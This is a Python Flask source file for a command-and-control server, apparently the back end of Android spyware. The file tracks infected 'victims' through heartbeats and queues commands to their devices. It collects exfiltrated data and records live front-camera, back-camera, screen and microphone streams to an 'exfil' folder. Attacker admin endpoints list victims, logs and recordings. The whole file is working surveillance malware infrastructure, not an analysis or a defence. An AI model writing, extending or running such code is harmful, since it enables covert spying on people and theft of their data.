import threading
import time
import uuid
import json
import os
import base64
import asyncio
import glob
from functools import wraps
from mux import MUX
from datetime import datetime
from flask import Flask, request, jsonify, send_file, g, Response, send_from_directory
from flask_cors import CORS
from flask_sock import Sock
from database import init_db, get_db, log_data

app = Flask(__name__, static_folder='static')
CORS(app)
sock = Sock(app)
init_db()

SECRET_TOKEN = os.environ.get("AEGIS_TOKEN", "AEGIS_SECRET_TOKEN_123")
RATE_LIMIT_PER_MINUTE = 100
rate_limit_store = {}

# --- Middleware ---

def require_auth(f):
    @wraps(f)
    def wrapper(*args, **kwargs):
        token = request.headers.get('X-Aegis-Token')
        if not token:
            auth_header = request.headers.get('Authorization', '')
            if auth_header.startswith('Bearer '):
                token = auth_header.split(' ')[1]
            elif request.is_json:
                token = request.json.get('auth_token')
        if token != SECRET_TOKEN:
            return jsonify({"error": "Unauthorized"}), 401
        return f(*args, **kwargs)
    return wrapper

def rate_limit(f):
    @wraps(f)
    def wrapper(*args, **kwargs):
        victim_id = request.args.get('victim_id')
        if not victim_id and request.is_json:
            victim_id = request.json.get('victim_id')
        if not victim_id:
            return f(*args, **kwargs)
        now = time.time()
        if victim_id not in rate_limit_store:
            rate_limit_store[victim_id] = []
        rate_limit_store[victim_id] = [t for t in rate_limit_store[victim_id] if now - t < 60]
        if len(rate_limit_store[victim_id]) >= RATE_LIMIT_PER_MINUTE:
            return jsonify({"error": "Rate limit exceeded"}), 429
        rate_limit_store[victim_id].append(now)
        return f(*args, **kwargs)
    return wrapper

@app.route('/api/v1/streams/state', methods=['POST'])
@require_auth
def update_stream_state():
    data = request.json
    victim_id = data.get('victim_id')
    stream_type = data.get('stream_type') # 'front', 'back', 'screen', 'mic'
    state = data.get('state', 'active') # 'active', 'thumbnail', 'paused'
    
    if not victim_id or not stream_type:
        return jsonify({"error": "Missing parameters"}), 400
        
    MUX.set_stream_state(victim_id, stream_type, state)
    return jsonify({"status": "ok", "states": MUX.get_all_states(victim_id)})

@sock.route('/stream/<stream_type>')
def stream_handler(stream_type):
    """
    Handles live streaming.
    """
    async def _stream_handler(ws):
        victim_id = ws.args.get('victim_id', 'unknown')
        subscriber_id = str(uuid.uuid4())
        
        # Subscribe to MUX updates
        MUX.subscribe(victim_id, subscriber_id)
        print(f"[C2] {stream_type} stream connected for {victim_id} (Sub: {subscriber_id})")
        
        # Send initial state
        current_state = MUX.get_stream_state(victim_id, stream_type)
        await ws.send(json.dumps({
            "type": "init", 
            "victim_id": victim_id, 
            "stream": stream_type,
            "state": current_state
        }))
        
        # Start local recording
        record_dir = os.path.join("exfil", str(victim_id), "streams", stream_type)
        os.makedirs(record_dir, exist_ok=True)
        timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M")
        record_path = os.path.join(record_dir, f"{timestamp}.mp4")
        
        print(f"[C2] Recording {stream_type} to {record_path}")
        
        with open(record_path, 'wb') as f:
            try:
                while True:
                    # Check if stream is still active
                    if MUX.get_stream_state(victim_id, stream_type) == 'paused':
                        # If paused, we can either close the connection or just not write to disk
                        # For now, we keep the connection open but don't record
                        pass
                    
                    frame = await ws.receive()
                    if not frame:
                        break
                    
                    # Only record if active or thumbnail
                    if MUX.get_stream_state(victim_id, stream_type) in ['active', 'thumbnail']:
                        f.write(frame)
                        
            except Exception as e:
                print(f"[C2] {stream_type} stream error: {e}")
            finally:
                MUX.unsubscribe(victim_id, subscriber_id)
                print(f"[C2] {stream_type} stream disconnected for {victim_id}")

    return _stream_handler



# --- Static File Serving (The Dashboard) ---

@app.route('/')
def index():
    return send_from_directory('static', 'index.html')

@app.route('/<path:path>')
def static_files(path):
    return send_from_directory('static', path)

# --- Payload Endpoints ---

@app.route('/api/v1/heartbeat', methods=['POST'])
@require_auth
@rate_limit
def heartbeat():
    data = request.json
    victim_id = data.get('victim_id')
    info = data.get('info', {})
    
    if not victim_id:
        return jsonify({"error": "Missing victim_id"}), 400

    conn = get_db()
    c = conn.cursor()
    # Upsert Victim
    c.execute('''INSERT OR REPLACE INTO victims (id, hostname, ip, os, last_seen, status) 
                 VALUES (?, ?, ?, ?, datetime('now'), 'online')''',
              (victim_id, info.get('hostname'), info.get('ip'), info.get('os')))
    
    # Upsert Profile
    c.execute('''INSERT OR REPLACE INTO victim_profiles (victim_id, alias, last_seen, device_model, android_version, battery_level)
                 VALUES (?, ?, datetime('now'), ?, ?, ?)
                 ON CONFLICT(victim_id) DO UPDATE SET 
                 last_seen=datetime('now'), 
                 device_model=excluded.device_model,
                 android_version=excluded.android_version,
                 battery_level=excluded.battery_level''',
              (victim_id, info.get('alias', 'Unknown'), info.get('model'), info.get('android_version'), info.get('battery')))
    
    conn.commit()
    conn.close()
    
    print(f"[C2] Heartbeat received from {victim_id} ({info.get('hostname')})")
    return jsonify({"status": "ok"})

@app.route('/api/v1/commands', methods=['GET'])
@require_auth
@rate_limit
def poll_commands():
    victim_id = request.args.get('victim_id')
    if not victim_id:
        return jsonify([])

    conn = get_db()
    c = conn.cursor()
    c.execute("SELECT id, action, args FROM commands WHERE victim_id = ? AND status = 'pending'", (victim_id,))
    rows = c.fetchall()
    commands = [{"id": r[0], "action": r[1], "args": json.loads(r[2]) if r[2] else {}} for r in rows]
    
    if commands:
        c.execute("UPDATE commands SET status = 'dispatched' WHERE victim_id = ?", (victim_id,))
        conn.commit()
    conn.close()
    return jsonify(commands)

@app.route('/api/v1/response', methods=['POST'])
@require_auth
@rate_limit
def receive_response():
    data = request.json
    victim_id = data.get('victim_id')
    command_id = data.get('command_id')
    success = data.get('success')
    payload = data.get('data')
    
    log_data(victim_id, {"command_id": command_id, "success": success, "payload": payload})
    
    if command_id and command_id != "passive":
        conn = get_db()
        c = conn.cursor()
        c.execute("UPDATE commands SET status = 'completed' WHERE id = ? AND victim_id = ?", (command_id, victim_id))
        conn.commit()
        conn.close()
        
    return jsonify({"status": "received"})

# --- Storage Browser API ---

@app.route('/api/v1/storage/list', methods=['GET'])
@require_auth
def storage_list():
    victim_id = request.args.get('victim_id')
    path = request.args.get('path', '/sdcard')
    
    # In a real implementation, this would be a command sent to the payload.
    # For now, we simulate a list of files for the UI demo.
    # TODO: Replace with actual payload command execution
    mock_files = [
        {"name": "DCIM", "path": f"{path}/DCIM", "is_dir": True},
        {"name": "Download", "path": f"{path}/Download", "is_dir": True},
        {"name": "secret_doc.pdf", "path": f"{path}/secret_doc.pdf", "is_dir": False},
        {"name": "passwords.txt", "path": f"{path}/passwords.txt", "is_dir": False}
    ]
    
    return jsonify({"path": path, "files": mock_files})

@app.route('/api/v1/storage/read', methods=['GET'])
@require_auth
def storage_read():
    victim_id = request.args.get('victim_id')
    path = request.args.get('path')
    
    # Simulate reading a file
    return jsonify({"content": "This is the content of the file."})



# --- Admin Endpoints for Attacker ---

@app.route('/api/v1/admin/victims', methods=['GET'])
def list_victims():
    conn = get_db()
    c = conn.cursor()
    c.execute('''
        SELECT v.id, v.hostname, v.ip, v.os, v.last_seen, v.status, 
               p.alias, p.device_model, p.battery_level
        FROM victims v
        LEFT JOIN victim_profiles p ON v.id = p.victim_id
    ''')
    rows = c.fetchall()
    victims = [{
        "id": r[0], 
        "hostname": r[1], 
        "ip": r[2], 
        "os": r[3], 
        "last_seen": r[4], 
        "status": r[5],
        "alias": r[6] or "Unknown",
        "device_model": r[7] or "Unknown",
        "battery_level": r[8] or 0
    } for r in rows]
    conn.close()
    return jsonify(victims)

@app.route('/api/v1/admin/queue', methods=['POST'])
def queue_command():
    data = request.json
    victim_id = data.get('victim_id')
    action = data.get('action')
    args = data.get('args')
    
    if not victim_id or not action:
        return jsonify({"error": "Missing victim_id or action"}), 400
        
    cmd_id = str(uuid.uuid4())
    conn = get_db()
    c = conn.cursor()
    c.execute("INSERT INTO commands (id, victim_id, action, args, status, created_at) VALUES (?, ?, ?, ?, 'pending', datetime('now'))",
              (cmd_id, victim_id, action, json.dumps(args) if args else None))
    conn.commit()
    conn.close()
    
    print(f"[C2] Queued command {cmd_id} for {victim_id}: {action}")
    return jsonify({"id": cmd_id})

@app.route('/api/v1/admin/logs', methods=['GET'])
def get_logs():
    victim_id = request.args.get('victim_id')
    limit = request.args.get('limit', 50, type=int)
    
    conn = get_db()
    c = conn.cursor()
    c.execute("SELECT * FROM logs WHERE victim_id = ? ORDER BY id DESC LIMIT ?", (victim_id, limit))
    rows = c.fetchall()
    logs = [{"id": r[0], "victim_id": r[1], "timestamp": r[2], "data": r[3]} for r in rows]
    conn.close()
    return jsonify(logs)

@app.route('/api/v1/admin/archive', methods=['GET'])
def get_archive():
    victim_id = request.args.get('victim_id')
    stream_type = request.args.get('stream_type', 'front_cam')
    
    # List files in the archive folder
    archive_dir = os.path.join("exfil", str(victim_id), "streams", stream_type)
    if not os.path.exists(archive_dir):
        return jsonify([])
        
    files = os.listdir(archive_dir)
    # Filter only .mp4 files and sort by name (descending)
    mp4_files = [f for f in files if f.endswith('.mp4')][::-1]
    
    return jsonify(mp4_files)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, threaded=True)
